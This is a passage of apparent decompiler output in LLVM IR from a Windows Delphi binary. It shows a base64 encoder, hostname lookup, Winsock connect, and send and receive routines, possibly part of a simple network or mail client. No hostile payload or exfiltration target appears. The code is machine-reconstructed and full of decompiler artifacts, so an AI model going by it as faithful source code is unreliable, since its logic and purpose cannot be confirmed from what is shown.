  %15 = load i64, i64* %14, align 4, !insn.addr !518
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !518
  %17 = add i32 %16, -2, !insn.addr !519
  %18 = inttoptr i32 %17 to i16*, !insn.addr !519
  store i16 27241, i16* %18, align 2, !insn.addr !519
  %19 = mul i32 %2, 2, !insn.addr !520
  %20 = add i32 %2, 110, !insn.addr !520
  %21 = add i32 %20, %19, !insn.addr !520
  %22 = inttoptr i32 %21 to i32*, !insn.addr !520
  %23 = load i32, i32* %22, align 4, !insn.addr !520
  %24 = sext i32 %23 to i64, !insn.addr !520
  %25 = mul nsw i64 %24, 111, !insn.addr !520
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !520
  %28 = icmp eq i64 %25, %27, !insn.addr !520
  br i1 %28, label %dec_label_pc_404db1, label %dec_label_pc_404e20, !insn.addr !521

dec_label_pc_404db1:                              ; preds = %dec_label_pc_404d7f
  %29 = icmp eq i32 %0, 0, !insn.addr !522
  br i1 %29, label %dec_label_pc_404e28, label %dec_label_pc_404db5, !insn.addr !523

dec_label_pc_404db5:                              ; preds = %dec_label_pc_404db1
  %30 = icmp slt i32 %0, 0, !insn.addr !522
  br i1 %30, label %dec_label_pc_404e30, label %dec_label_pc_404db7, !insn.addr !524

dec_label_pc_404db7:                              ; preds = %dec_label_pc_404db5
  %31 = trunc i32 %0 to i8, !insn.addr !522
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !525, !insn.addr !522
  %33 = and i8 %32, 1, !insn.addr !522
  %34 = icmp eq i8 %33, 0, !insn.addr !522
  br i1 %34, label %dec_label_pc_404de9, label %dec_label_pc_404db9, !insn.addr !526

dec_label_pc_404db9:                              ; preds = %dec_label_pc_404db7
  %35 = add i32 %12, -1, !insn.addr !516
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !527
  %37 = load i32, i32* %36, align 4, !insn.addr !527
  %38 = xor i32 %37, %1, !insn.addr !527
  store i32 %38, i32* %36, align 4, !insn.addr !527
  %39 = add i32 %1, 959985462, !insn.addr !528
  %40 = inttoptr i32 %39 to i32*, !insn.addr !528
  %41 = load i32, i32* %40, align 4, !insn.addr !528
  %42 = xor i32 %41, %1, !insn.addr !528
  %43 = add i32 %16, -38, !insn.addr !529
  %44 = inttoptr i32 %43 to i32*, !insn.addr !529
  store i32 %35, i32* %44, align 4, !insn.addr !529
  %45 = add i32 %16, -42, !insn.addr !530
  %46 = inttoptr i32 %45 to i32*, !insn.addr !530
  store i32 %42, i32* %46, align 4, !insn.addr !530
  %47 = add i32 %16, -22, !insn.addr !531
  %48 = inttoptr i32 %47 to i32*, !insn.addr !531
  store i32 0, i32* %48, align 4, !insn.addr !531
  %49 = add i32 %16, -26, !insn.addr !532
  %50 = inttoptr i32 %49 to i32*, !insn.addr !532
  store i32 0, i32* %50, align 4, !insn.addr !532
  %51 = add i32 %16, -30, !insn.addr !533
  %52 = inttoptr i32 %51 to i32*, !insn.addr !533
  store i32 0, i32* %52, align 4, !insn.addr !533
  %53 = add i32 %16, -34, !insn.addr !534
  %54 = inttoptr i32 %53 to i32*, !insn.addr !534
  store i32 0, i32* %54, align 4, !insn.addr !534
  %55 = add i32 %16, -6, !insn.addr !535
  %56 = inttoptr i32 %55 to i32*, !insn.addr !535
  store i32 %arg3, i32* %56, align 4, !insn.addr !535
  %57 = add i32 %16, -46, !insn.addr !536
  %58 = inttoptr i32 %57 to i32*, !insn.addr !536
  store i32 %17, i32* %58, align 4, !insn.addr !536
  ret i32 0, !insn.addr !536

dec_label_pc_404de9:                              ; preds = %dec_label_pc_404db7
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !537
  %60 = trunc i64 %25 to i32, !insn.addr !520
  %61 = load i32, i32* %eax, align 4, !insn.addr !538
  %62 = add i32 %61, 1, !insn.addr !538
  %63 = mul i32 %59, 8, !insn.addr !539
  %64 = add i32 %59, 48, !insn.addr !539
  %65 = add i32 %64, %63, !insn.addr !539
  %66 = inttoptr i32 %65 to i8*, !insn.addr !539
  %67 = load i8, i8* %66, align 4, !insn.addr !539
  %68 = udiv i32 %62, 256, !insn.addr !539
  %69 = trunc i32 %68 to i8, !insn.addr !539
  %70 = add i8 %67, %69, !insn.addr !539
  store i8 %70, i8* %66, align 4, !insn.addr !539
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !540
  %71 = call i32 @"@LStrClr"(), !insn.addr !541
  %72 = call i32 @function_4034c8(), !insn.addr !542
  %73 = add i32 %60, -8, !insn.addr !543
  %74 = inttoptr i32 %73 to i32*, !insn.addr !543
  store i32 %72, i32* %74, align 4, !insn.addr !543
  %75 = ashr i32 %72, 31, !insn.addr !544
  %76 = zext i32 %72 to i64, !insn.addr !545
  %77 = zext i32 %75 to i64, !insn.addr !545
  %78 = mul i64 %77, 4294967296, !insn.addr !545
  %79 = or i64 %78, %76, !insn.addr !545
  %80 = sdiv i64 %79, 3, !insn.addr !545
  %81 = trunc i64 %80 to i32, !insn.addr !545
  store i32 %81, i32* %eax, align 4, !insn.addr !545
  %82 = srem i64 %79, 3, !insn.addr !545
  %83 = trunc i64 %82 to i32, !insn.addr !545
  %84 = icmp eq i32 %83, 0, !insn.addr !546
  %85 = icmp eq i1 %84, false, !insn.addr !547
  br i1 %85, label %dec_label_pc_404e1f, label %dec_label_pc_404e12, !insn.addr !547

dec_label_pc_404e12:                              ; preds = %dec_label_pc_404de9
  %86 = load i32, i32* %74, align 4, !insn.addr !548
  %87 = ashr i32 %86, 31, !insn.addr !549
  %88 = zext i32 %86 to i64, !insn.addr !550
  %89 = zext i32 %87 to i64, !insn.addr !550
  %90 = mul i64 %89, 4294967296, !insn.addr !550
  %91 = or i64 %90, %88, !insn.addr !550
  %92 = sdiv i64 %91, 3, !insn.addr !550
  %93 = trunc i64 %92 to i32, !insn.addr !550
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !551
  br label %dec_label_pc_404e2c, !insn.addr !551

dec_label_pc_404e1f:                              ; preds = %dec_label_pc_404de9
  ret i32 %81, !insn.addr !551

dec_label_pc_404e20:                              ; preds = %dec_label_pc_404d7f
  %94 = load i32, i32* %eax, align 4, !insn.addr !552
  ret i32 %94, !insn.addr !552

dec_label_pc_404e28:                              ; preds = %dec_label_pc_404db1
  %95 = load i32, i32* %eax, align 4, !insn.addr !553
  %96 = zext i32 %95 to i64, !insn.addr !553
  %97 = zext i32 %arg3 to i64, !insn.addr !553
  %98 = mul i64 %97, 4294967296, !insn.addr !553
  %99 = or i64 %98, %96, !insn.addr !553
  %100 = zext i32 %arg2 to i64, !insn.addr !553
  %101 = sdiv i64 %99, %100, !insn.addr !553
  %102 = trunc i64 %101 to i32, !insn.addr !553
  %103 = add i32 %102, 1, !insn.addr !554
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !554
  br label %dec_label_pc_404e2c, !insn.addr !554

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404e12, %dec_label_pc_404e28
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !555
  ret i32 %104, !insn.addr !556

dec_label_pc_404e30:                              ; preds = %dec_label_pc_404db5
  %105 = inttoptr i32 %1 to i32*, !insn.addr !557
  %106 = load i32, i32* %105, align 4, !insn.addr !557
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !557
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !558
  %109 = load i32, i32* %108, align 4, !insn.addr !558
  %110 = add i32 %109, %107, !insn.addr !558
  store i32 %110, i32* %108, align 4, !insn.addr !558
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !559
  %113 = inttoptr i32 %112 to i8*, !insn.addr !559
  %114 = load i8, i8* %113, align 1, !insn.addr !559
  %115 = trunc i32 %111 to i8, !insn.addr !559
  %116 = add i8 %114, %115, !insn.addr !559
  store i8 %116, i8* %113, align 1, !insn.addr !559
  %117 = load i32, i32* %eax, align 4, !insn.addr !560
  ret i32 %117, !insn.addr !560
}

define i32 @function_404e38() local_unnamed_addr {
dec_label_pc_404e38:
  %ebx.0.reg2mem = alloca i32, !insn.addr !561
  %esp.0.reg2mem = alloca i32, !insn.addr !561
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !562
  %3 = inttoptr i32 %2 to i32*, !insn.addr !562
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !563
  %13 = inttoptr i32 %12 to i32*, !insn.addr !563
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !561
  br label %dec_label_pc_404e3a, !insn.addr !561

dec_label_pc_404e3a:                              ; preds = %dec_label_pc_404f85, %dec_label_pc_404e38
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !564
  %25 = add i32 %24, 3, !insn.addr !565
  %26 = load i32, i32* %3, align 4, !insn.addr !562
  %27 = icmp sgt i32 %25, %26, !insn.addr !566
  br i1 %27, label %dec_label_pc_404eda, label %dec_label_pc_404e4b, !insn.addr !566

dec_label_pc_404e4b:                              ; preds = %dec_label_pc_404e3a
  %28 = add i32 %24, %0, !insn.addr !567
  %29 = inttoptr i32 %28 to i8*, !insn.addr !567
  %30 = load i8, i8* %29, align 1, !insn.addr !567
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !568
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !569
  %34 = inttoptr i32 %33 to i8*, !insn.addr !569
  %35 = load i8, i8* %34, align 1, !insn.addr !569
  store i8 %35, i8* %5, align 1, !insn.addr !570
  %36 = load i8, i8* %29, align 1, !insn.addr !571
  %37 = mul i8 %36, 16, !insn.addr !572
  %38 = and i8 %37, 48, !insn.addr !573
  %39 = add i32 %28, 1, !insn.addr !574
  %40 = inttoptr i32 %39 to i8*, !insn.addr !574
  %41 = load i8, i8* %40, align 1, !insn.addr !574
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !575
  %44 = zext i8 %43 to i32, !insn.addr !575
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !576
  %46 = inttoptr i32 %45 to i8*, !insn.addr !576
  %47 = load i8, i8* %46, align 1, !insn.addr !576
  store i8 %47, i8* %7, align 1, !insn.addr !577
  %48 = load i8, i8* %40, align 1, !insn.addr !578
  %49 = mul i8 %48, 4, !insn.addr !579
  %50 = and i8 %49, 60, !insn.addr !580
  %51 = add i32 %28, 2, !insn.addr !581
  %52 = inttoptr i32 %51 to i8*, !insn.addr !581
  %53 = load i8, i8* %52, align 1, !insn.addr !581
  %54 = udiv i8 %53, 64, !insn.addr !582
  %55 = or i8 %54, %50, !insn.addr !583
  %56 = zext i8 %55 to i32, !insn.addr !583
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !584
  %58 = inttoptr i32 %57 to i8*, !insn.addr !584
  %59 = load i8, i8* %58, align 1, !insn.addr !584
  store i8 %59, i8* %9, align 1, !insn.addr !585
  %60 = and i8 %53, 63, !insn.addr !586
  %61 = zext i8 %60 to i32, !insn.addr !586
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !587
  %63 = inttoptr i32 %62 to i8*, !insn.addr !587
  %64 = load i8, i8* %63, align 1, !insn.addr !587
  store i8 %64, i8* %11, align 1, !insn.addr !588
  br label %dec_label_pc_404f85, !insn.addr !589

dec_label_pc_404eda:                              ; preds = %dec_label_pc_404e3a
  %65 = add i32 %24, 2, !insn.addr !590
  %66 = icmp sgt i32 %65, %26, !insn.addr !591
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_404f49, label %dec_label_pc_404ee4, !insn.addr !591

dec_label_pc_404ee4:                              ; preds = %dec_label_pc_404eda
  %76 = mul i8 %75, 16, !insn.addr !592
  %77 = and i8 %76, 48, !insn.addr !593
  %78 = add i32 %67, 1, !insn.addr !594
  %79 = inttoptr i32 %78 to i8*, !insn.addr !594
  %80 = load i8, i8* %79, align 1, !insn.addr !594
  %81 = zext i8 %80 to i32, !insn.addr !594
  %82 = udiv i8 %80, 16, !insn.addr !595
  %83 = or i8 %82, %77, !insn.addr !596
  %84 = zext i8 %83 to i32, !insn.addr !596
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !597
  %86 = inttoptr i32 %85 to i8*, !insn.addr !597
  %87 = load i8, i8* %86, align 1, !insn.addr !597
  store i8 %87, i8* %7, align 1, !insn.addr !598
  %88 = mul i32 %81, 4, !insn.addr !599
  %89 = and i32 %88, 60, !insn.addr !600
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !601
  %91 = inttoptr i32 %90 to i8*, !insn.addr !601
  %92 = load i8, i8* %91, align 4, !insn.addr !601
  store i8 %92, i8* %9, align 1, !insn.addr !602
  store i8 61, i8* %11, align 1, !insn.addr !603
  br label %dec_label_pc_404f85, !insn.addr !604

dec_label_pc_404f49:                              ; preds = %dec_label_pc_404eda
  %93 = zext i8 %75 to i32, !insn.addr !605
  %94 = mul i32 %93, 16, !insn.addr !606
  %95 = and i32 %94, 48, !insn.addr !607
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_404d84 to i32), !insn.addr !608
  %97 = inttoptr i32 %96 to i8*, !insn.addr !608
  %98 = load i8, i8* %97, align 16, !insn.addr !608
  store i8 %98, i8* %7, align 1, !insn.addr !609
  store i8 61, i8* %9, align 1, !insn.addr !610
  store i8 61, i8* %11, align 1, !insn.addr !611
  br label %dec_label_pc_404f85, !insn.addr !611

dec_label_pc_404f85:                              ; preds = %dec_label_pc_404f49, %dec_label_pc_404ee4, %dec_label_pc_404e4b
  %99 = load i32, i32* %13, align 4, !insn.addr !563
  %100 = inttoptr i32 %99 to i32*, !insn.addr !612
  %101 = load i32, i32* %100, align 4, !insn.addr !612
  %102 = add i32 %esp.0.reload, -4, !insn.addr !612
  %103 = inttoptr i32 %102 to i32*, !insn.addr !612
  store i32 %101, i32* %103, align 4, !insn.addr !612
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !613
  %105 = load i32, i32* %15, align 4, !insn.addr !614
  %106 = add i32 %esp.0.reload, -8, !insn.addr !614
  %107 = inttoptr i32 %106 to i32*, !insn.addr !614
  store i32 %105, i32* %107, align 4, !insn.addr !614
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !615
  %109 = load i32, i32* %17, align 4, !insn.addr !616
  %110 = add i32 %esp.0.reload, -12, !insn.addr !616
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !616
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !617
  %113 = load i32, i32* %19, align 4, !insn.addr !618
  %114 = add i32 %esp.0.reload, -16, !insn.addr !618
  %115 = inttoptr i32 %114 to i32*, !insn.addr !618
  store i32 %113, i32* %115, align 4, !insn.addr !618
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !619
  %117 = load i32, i32* %21, align 4, !insn.addr !620
  %118 = add i32 %esp.0.reload, -20, !insn.addr !620
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !620
  %120 = call i32 @"@LStrCatN"(), !insn.addr !621
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !622
  %122 = load i32, i32* %23, align 4, !insn.addr !623
  %123 = add i32 %122, -1, !insn.addr !623
  %124 = icmp eq i32 %123, 0, !insn.addr !623
  store i32 %123, i32* %23, align 4, !insn.addr !623
  %125 = icmp eq i1 %124, false, !insn.addr !624
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !624
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !624
  br i1 %125, label %dec_label_pc_404e3a, label %dec_label_pc_404fd9, !insn.addr !624

dec_label_pc_404fd9:                              ; preds = %dec_label_pc_404f85
  %126 = load i32, i32* %119, align 4, !insn.addr !625
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !626
  store i32 4214779, i32* %111, align 4, !insn.addr !627
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !628
  ret i32 %127, !insn.addr !629
}

define i32 @function_404ff4() local_unnamed_addr {
dec_label_pc_404ff4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !630
  ret i32 %0, !insn.addr !630
}

define i32 @function_404ff9() local_unnamed_addr {
dec_label_pc_404ff9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !631
}

define i32 @function_404ffb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404ffb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !632
}

define i32 @function_405004() local_unnamed_addr {
dec_label_pc_405004:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !633
  %0 = call i32 @function_4036c8(), !insn.addr !634
  %1 = inttoptr i32 %0 to i8*, !insn.addr !635
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !636
  %3 = call i32 @"@FillChar"(), !insn.addr !637
  %4 = icmp eq %hostent* %2, null, !insn.addr !638
  br i1 %4, label %dec_label_pc_40504f, label %dec_label_pc_40502d, !insn.addr !639

dec_label_pc_40502d:                              ; preds = %dec_label_pc_405004
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !636
  %6 = add i32 %5, 12, !insn.addr !640
  %7 = inttoptr i32 %6 to i32*, !insn.addr !640
  %8 = load i32, i32* %7, align 4, !insn.addr !640
  %9 = inttoptr i32 %8 to i32*, !insn.addr !641
  %10 = load i32, i32* %9, align 4, !insn.addr !641
  %11 = inttoptr i32 %10 to i8*, !insn.addr !642
  %12 = load i8, i8* %11, align 1, !insn.addr !642
  %13 = sext i8 %12 to i32, !insn.addr !643
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !644
  br label %dec_label_pc_40504f, !insn.addr !644

dec_label_pc_40504f:                              ; preds = %dec_label_pc_40502d, %dec_label_pc_405004
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !645
}

define i32 @function_405060() local_unnamed_addr {
dec_label_pc_405060:
  %esp.0.reg2mem = alloca i32, !insn.addr !646
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !647
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !648
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !648
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !648
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !649
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !650
  %5 = trunc i32 %4 to i16, !insn.addr !650
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !651
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !652
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !652
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !653
  %9 = icmp eq i32 %8, -1, !insn.addr !654
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !655
  br i1 %9, label %dec_label_pc_4050ee, label %dec_label_pc_4050af, !insn.addr !655

dec_label_pc_4050af:                              ; preds = %dec_label_pc_405060
  %10 = call i32 @function_405004(), !insn.addr !656
  %11 = trunc i32 %10 to i16, !insn.addr !657
  %12 = call i16 @htons(i16 %11), !insn.addr !657
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !658
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !658
  %14 = sext i16 %12 to i32, !insn.addr !659
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !659
  %16 = icmp eq i32 %15, 0, !insn.addr !660
  %17 = icmp eq i1 %16, false, !insn.addr !661
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !661
  br i1 %17, label %dec_label_pc_4050ee, label %dec_label_pc_4050e6, !insn.addr !661

dec_label_pc_4050e6:                              ; preds = %dec_label_pc_4050af
  %18 = inttoptr i32 %0 to i32*, !insn.addr !662
  store i32 %8, i32* %18, align 4, !insn.addr !662
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !663
  br label %dec_label_pc_4050ee, !insn.addr !663

dec_label_pc_4050ee:                              ; preds = %dec_label_pc_4050e6, %dec_label_pc_4050af, %dec_label_pc_405060
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !664
  %20 = load i32, i32* %19, align 4, !insn.addr !664
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !665
  %21 = add i32 %esp.0.reload, 8, !insn.addr !666
  %22 = inttoptr i32 %21 to i32*, !insn.addr !666
  store i32 4215051, i32* %22, align 4, !insn.addr !666
  %23 = call i32 @"@LStrClr"(), !insn.addr !667
  ret i32 %23, !insn.addr !668
}

define i32 @function_405104() local_unnamed_addr {
dec_label_pc_405104:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !669
  ret i32 %0, !insn.addr !669
}

define i32 @function_405109() local_unnamed_addr {
dec_label_pc_405109:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !670
}

define i32 @function_40510b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40510b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !671
}

define i32 @function_405114() local_unnamed_addr {
dec_label_pc_405114:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !672
  %2 = call i32 @WSACleanup(), !insn.addr !673
  ret i32 %2, !insn.addr !674
}

define i32 @function_405120() local_unnamed_addr {
dec_label_pc_405120:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !675
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !676
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !676
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !676
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !677
  %4 = call i32 @function_4036c8(), !insn.addr !678
  %5 = call i32 @StrCopy(), !insn.addr !679
  %6 = call i32 @function_406f7c(i32 4), !insn.addr !680
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !681
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !682
  %9 = call i32 @"@LStrClr"(), !insn.addr !683
  ret i32 %9, !insn.addr !684
}

define i32 @function_405191() local_unnamed_addr {
dec_label_pc_405191:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !685
  ret i32 %0, !insn.addr !685
}

define i32 @function_405196() local_unnamed_addr {
dec_label_pc_405196:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !686
}

define i32 @function_405198(i32 %arg1) local_unnamed_addr {
dec_label_pc_405198:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !687
}

define i32 @function_4051a0() local_unnamed_addr {
dec_label_pc_4051a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !688
  %2 = call i32 @StrPas(), !insn.addr !689
  ret i32 %2, !insn.addr !690
}

define i32 @function_4051cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4051cc:
  %esp.1.reg2mem = alloca i32, !insn.addr !691
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !691
  %esp.0.reg2mem = alloca i32, !insn.addr !691
  %ecx.0.reg2mem = alloca i32, !insn.addr !691
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !692
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !693
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !693
  br label %dec_label_pc_4051d5, !insn.addr !693

dec_label_pc_4051d5:                              ; preds = %dec_label_pc_4051d5, %dec_label_pc_4051cc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !694
  %2 = inttoptr i32 %1 to i32*, !insn.addr !694
  store i32 0, i32* %2, align 4, !insn.addr !694
  %3 = add i32 %esp.0.reload, -8, !insn.addr !695
  %4 = inttoptr i32 %3 to i32*, !insn.addr !695
  store i32 0, i32* %4, align 4, !insn.addr !695
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !696
  %6 = icmp eq i32 %5, 0, !insn.addr !696
  %7 = icmp eq i1 %6, false, !insn.addr !697
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !697
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !697
  br i1 %7, label %dec_label_pc_4051d5, label %dec_label_pc_4051dc, !insn.addr !697

dec_label_pc_4051dc:                              ; preds = %dec_label_pc_4051d5
  %8 = add i32 %esp.0.reload, -12, !insn.addr !698
  %9 = inttoptr i32 %8 to i32*, !insn.addr !698
  store i32 0, i32* %9, align 4, !insn.addr !698
  %10 = call i32 @function_4036b8(), !insn.addr !699
  %11 = call i32 @function_4036b8(), !insn.addr !700
  %12 = call i32 @function_4036b8(), !insn.addr !701
  %13 = call i32 @function_4036b8(), !insn.addr !702
  %14 = call i32 @function_4036b8(), !insn.addr !703
  %15 = call i32 @function_4036b8(), !insn.addr !704
  %16 = call i32 @function_4036b8(), !insn.addr !705
  %17 = add i32 %esp.0.reload, -20, !insn.addr !706
  %18 = inttoptr i32 %17 to i32*, !insn.addr !706
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !706
  store i32 %19, i32* %18, align 4, !insn.addr !706
  %20 = add i32 %esp.0.reload, -24, !insn.addr !707
  %21 = inttoptr i32 %20 to i32*, !insn.addr !707
  store i32 4215873, i32* %21, align 4, !insn.addr !707
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !708
  %23 = add i32 %esp.0.reload, -28, !insn.addr !708
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !708
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !709
  %25 = call i32 @function_405060(), !insn.addr !710
  %26 = icmp eq i32 %25, 0, !insn.addr !711
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !712
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !712
  br i1 %26, label %dec_label_pc_40540c, label %dec_label_pc_40524a, !insn.addr !712

dec_label_pc_40524a:                              ; preds = %dec_label_pc_4051dc
  %27 = add i32 %esp.0.reload, -32, !insn.addr !713
  %28 = inttoptr i32 %27 to i32*, !insn.addr !713
  store i32 ptrtoint ([6 x i8]* @global_var_40545c to i32), i32* %28, align 4, !insn.addr !713
  %29 = add i32 %esp.0.reload, -36, !insn.addr !714
  %30 = inttoptr i32 %29 to i32*, !insn.addr !714
  %31 = add i32 %esp.0.reload, -40, !insn.addr !715
  %32 = inttoptr i32 %31 to i32*, !insn.addr !715
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %32, align 4, !insn.addr !715
  %33 = call i32 @"@LStrCatN"(), !insn.addr !716
  %34 = call i32 @function_405120(), !insn.addr !717
  %35 = call i32 @function_4051a0(), !insn.addr !718
  %36 = call i32 @function_405120(), !insn.addr !719
  %37 = call i32 @function_4051a0(), !insn.addr !720
  %38 = call i32 @"@LStrCat"(), !insn.addr !721
  %39 = call i32 @function_405120(), !insn.addr !722
  %40 = call i32 @function_4051a0(), !insn.addr !723
  %41 = call i32 @"@LStrCat"(), !insn.addr !724
  %42 = call i32 @function_405120(), !insn.addr !725
  %43 = call i32 @function_4051a0(), !insn.addr !726
